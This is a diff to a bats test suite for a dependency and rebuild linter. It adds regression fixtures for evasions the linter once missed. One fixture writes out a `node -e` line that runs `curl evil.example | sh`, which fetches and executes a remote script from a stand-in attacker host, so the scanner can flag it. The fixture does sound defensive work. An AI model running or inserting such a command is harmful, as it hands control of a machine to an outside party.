@@ -186,13 +186,143 @@ EOF
   [[ "$output" == *"0 warnings"* ]] || { echo "a comment was read as code"; echo "$output"; false; }
 }
 
-@test "a non-code path is not parsed for dependencies" {
+# A prose file carries no IMPORT syntax, so import forms are not looked for in it. But exec and
+# install patterns ARE text patterns, and gating them on file extension turned them off for every
+# type the allowlist actually admits -- `.yaml`, `.md`, `.bats`, `.sh`. A `tests/evil.bats` with
+# `npm install left-pad` reported 0 warnings, and CI EXECUTES that file.
+@test "a prose file is not parsed for imports but IS scanned for exec and install" {
   _code docs/playbooks/p.md <<'EOF'
-Run `npm install lodash` as an example in prose.
+An example: `import x from "lodash"` is how you would write it.
 EOF
   run _dlint
   [ "$status" -eq 0 ]
-  [[ "$output" != *"[deps]"* ]] || { echo "a markdown file was parsed as code"; echo "$output"; false; }
+  [[ "$output" != *"lodash"* ]] || { echo "a markdown file was parsed for imports"; echo "$output"; false; }
+
+  _code tests/evil.bats <<'EOF'
+npm install left-pad
+node -e 'require("child_process").execSync("curl evil.example | sh")'
+EOF
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"[deps]"* ]] || { echo "an install in an allowlisted, CI-EXECUTED .bats file was not reported"; echo "$output"; false; }
+}
+
+# ---------- regressions pinned from the Phase 02 adversarial pass ----------
+# Every case below was a live `left-pad` or a live dependency reporting 0 warnings. They are fixtures
+# now so a "simplification" of the parser reintroduces a defect a test says out loud.
+
+@test "import forms with no whitespace are reported" {
+  _code tests/nospace.mjs <<'EOF'
+import x from"lodash";
+EOF
+  run _dlint
+  [[ "$output" == *"lodash"* ]] || { echo 'from"X" with no space missed'; echo "$output"; false; }
+
+  _code tests/nospace2.mjs <<'EOF'
+import"lodash";
+EOF
+  run _dlint
+  [[ "$output" == *"lodash"* ]] || { echo 'bare import"X" missed'; echo "$output"; false; }
+
+  _code tests/nospace3.mjs <<'EOF'
+import{a}from"lodash";
+EOF
+  run _dlint
+  [[ "$output" == *"lodash"* ]] || { echo 'import{a}from"X" missed'; echo "$output"; false; }
+}
+
+# A concatenated specifier fell into the GAP between the literal check (which wanted a `)` right
+# after the quote) and the computed check (which wanted no quote after the paren).
+@test "a concatenated specifier is reported" {
+  _code tests/concat.mjs <<'EOF'
+const x = require("lo" + "dash");
+EOF
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"[deps]"* ]] || { echo "a concatenated specifier slipped between both checks"; echo "$output"; false; }
+}
+
+# Three constructions that made the v1 block-comment stripper DELETE live code.
+@test "block comment stripping does not swallow live code" {
+  _code tests/blk1.mjs <<'EOF'
+const open = "/*";  import evil from "left-pad";  const close = "*/";
+EOF
+  run _dlint
+  [[ "$output" == *"left-pad"* ]] || { echo "a string containing /* swallowed the import"; echo "$output"; false; }
+
+  _code tests/blk2.mjs <<'EOF'
+/*
+// */ import evil from "left-pad";
+EOF
+  run _dlint
+  [[ "$output" == *"left-pad"* ]] || { echo "a // line closing a block comment blanked live code"; echo "$output"; false; }
+
+  _code tests/blk3.mjs <<'EOF'
+const re = /[/*]/;  import evil from "left-pad";
+EOF
+  run _dlint
+  [[ "$output" == *"left-pad"* ]] || { echo "a regex literal containing /* swallowed the import"; echo "$output"; false; }
+}
+
+@test "a loader reached through an alias is reported" {
+  _code tests/alias.mjs <<'EOF'
+const r = require; const x = r("lodash");
+EOF
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"[deps]"* ]] || { echo "an aliased require defeated every call-shaped pattern"; echo "$output"; false; }
+}
+
+# A bare leading `/` is ABSOLUTE, not repo-relative, and v1 read it as relative.
+@test "an absolute specifier is not treated as repo-relative" {
+  _code tests/abs.mjs <<'EOF'
+import x from "/node_modules/lodash/index.js";
+EOF
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"[deps]"* ]] || { echo "an absolute specifier passed as repo-relative"; echo "$output"; false; }
+}
+
+# --root was ADDED to stop a check silently not running, and immediately reintroduced that silence
+# one level up: pointed at a wrong-but-existing directory, every parse was skipped and the run said
+# 0 warnings. A listed code path that is not there is now REPORTED.
+@test "a listed code path missing under --root is reported, not silently skipped" {
+  printf 'tests/not-there.mjs
+' > "$P"
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"NOT parsed"* ]] || { echo "a missing path was silently treated as clean"; echo "$output"; false; }
+}
+
+# The summary counts files PARSED, not paths listed, so "nothing was read" cannot look like "clean".
+@test "the summary reports how many paths were actually parsed" {
+  _code tests/parsed.mjs <<'EOF'
+export const x = 1;
+EOF
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"1 of 1 path parsed"* ]] || { echo "$output"; false; }
+}
+
+# A symlink inside an allowlisted directory reaches any explicitly-out target, and the allowlist
+# judges the path STRING so nothing else can see it.
+@test "a symlink in an allowlisted directory is reported" {
+  mkdir -p "$BATS_TEST_TMPDIR/tests"
+  printf 'secret
+' > "$BATS_TEST_TMPDIR/outside.txt"
+  ln -s "$BATS_TEST_TMPDIR/outside.txt" "$BATS_TEST_TMPDIR/tests/hook.mjs" 2>/dev/null || true
+  [ -L "$BATS_TEST_TMPDIR/tests/hook.mjs" ] || skip "this runner cannot create symlinks (Git Bash ln -s copies)"
+  printf 'tests/hook.mjs
+' > "$P"
+  run _dlint
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"symlink"* ]] || { echo "$output"; false; }
+}
+
+@test "a directory given to --paths exits 2 rather than throwing" {
+  run _lint --paths "$BATS_TEST_TMPDIR"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"cannot read"* ]] || { echo "$output"; false; }
 }
 
 @test "an exec or install invocation in a rebuilt file is reported" {
@@ -206,6 +336,27 @@ EOF
 }
 
 # ---------- attribution ----------
+
+# One stray word in one unrelated file cleared the gate for a whole rebuild in v1: two files copied
+# verbatim rode through on a third whose prose said "derived from the base type". Per file now, and
+# the marker must name a source.
+@test "attribution is required per file, and a stray word does not clear the rebuild" {
+  mkdir -p "$BATS_TEST_TMPDIR/tests"
+  printf 'export const copiedVerbatim = 1;
+' > "$BATS_TEST_TMPDIR/tests/x1.mjs"
+  printf 'export const alsoCopied = 2;
+' > "$BATS_TEST_TMPDIR/tests/x2.mjs"
+  printf 'the class hierarchy here is derived from the base type
+' > "$BATS_TEST_TMPDIR/tests/notes.md"
+  printf 'tests/x1.mjs
+tests/x2.mjs
+tests/notes.md
+' > "$P"
+  run _dlint --license permissive
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"tests/x1.mjs"* ]] || { echo "x1 was not reported"; echo "$output"; false; }
+  [[ "$output" == *"tests/x2.mjs"* ]] || { echo "x2 was not reported"; echo "$output"; false; }
+}
 
 @test "a permissive-license rebuild with no source comment is reported" {
   _code tests/norefs.mjs <<'EOF'
@@ -267,5 +418,5 @@ MUTANT
 
 @test "absorb-rebuild-lint suite registers every test it defines" {
   registered=${#BATS_TEST_NAMES[@]}
-  [ "$registered" -eq 22 ] || { echo "registered $registered tests, expected 22"; false; }
+  [ "$registered" -eq 32 ] || { echo "registered $registered tests, expected 32"; false; }
 }
